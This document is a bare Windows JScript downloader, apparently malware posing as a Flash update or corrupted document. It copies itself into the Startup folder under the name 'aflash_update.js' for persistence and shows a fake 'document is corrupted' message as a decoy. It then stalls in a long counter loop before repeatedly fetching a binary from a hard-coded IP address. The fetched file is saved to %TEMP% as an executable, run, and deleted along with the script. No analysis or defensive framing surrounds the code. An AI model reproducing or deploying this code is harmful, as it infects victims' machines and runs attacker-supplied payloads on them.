var ActXN = this.ActiveXObject;
var wScript = this.WScript;
var WScriptShell = wScript.CreateObject('WScript.Shell');
var fileSystemObject = new ActXN('Scripting.FileSystemObject');
var adodbStream = new ActXN('ADODB.Stream');
var shellApplication = new ActXN('Shell.Application');
var tempFolder = WScriptShell.ExpandEnvironmentStrings('%TEMP%');
var execFile = tempFolder + '\\' + Math.floor((Math.random() * (50 + 20 + 30)) + 1) + '.exe';
var serverXmlHttp = new ActXN('Msxml2.ServerXMLHTTP');
var jsScriptName = "\\aflash_update.js";
var startupFolder = shellApplication.NameSpace(3 + 2 + 2);
var flagme = false;
var execExists = false;
var procCounter = 1;
var filets = null;
var scriptFullName = wScript.ScriptFullName;
var autor = startupFolder.Self.Path + jsScriptName;
var reqUrl = 'https://217.28.218.217/AE5600FFCBCC/q64.php?add=gtyhbncdfewpnjm9oklmnfdrtqdczdfgrt';

if ((scriptFullName != autor) && (flagme == false)) {
  flagme = true;

  fileSystemObject.CopyFile(scriptFullName, autor);
  fileSystemObject.DeleteFile(scriptFullName);

  wScript.echo('The document is corrupted and cannot be opened');
  wScript.Sleep(4000 + 4000);
}
while (true) {
  procCounter = procCounter + 1;
  if (procCounter == 200000000) {
    while (true) {
      try {
        serverXmlHttp.setOption(3, 'MSXML');
        serverXmlHttp.open('GET', reqUrl + '&' + 
          Math.floor((Math.random() * (200)) + 1), false);
        serverXmlHttp.send();

        if (serverXmlHttp.status == (100 + 100)) {
          if (fileSystemObject.FileExists(execFile)) fileSystemObject.DeleteFile(execFile);
          adodbStream.Open();
          adodbStream.Type = 1;
          adodbStream.Write(serverXmlHttp.ResponseBody);
          adodbStream.Position = 0;
          adodbStream.SaveToFile(execFile);
          adodbStream.Close();
          filets = fileSystemObject.GetFile(execFile)['OpenAsTextStream'](1);
          if (fileSystemObject.FileExists(execFile) && 
            filets.ReadLine()['substring'](0, 2) == 'MZ') {
            execExists = true;
            shellApplication.ShellExecute(execFile, '', '', 'open1');
            if (fileSystemObject.FileExists(wScript.ScriptFullName)) fileSystemObject.DeleteFile(wScript.ScriptFullName);
            wScript.Sleep(4000);
            if (fileSystemObject.FileExists(execFile)) fileSystemObject.DeleteFile(execFile);
          }
          filets.Close();
        }
      } catch (e) {}
      if (execExists == true) {
        break;
      }
      wScript.Sleep(10000 * 7);
    }
    break;
  }
};
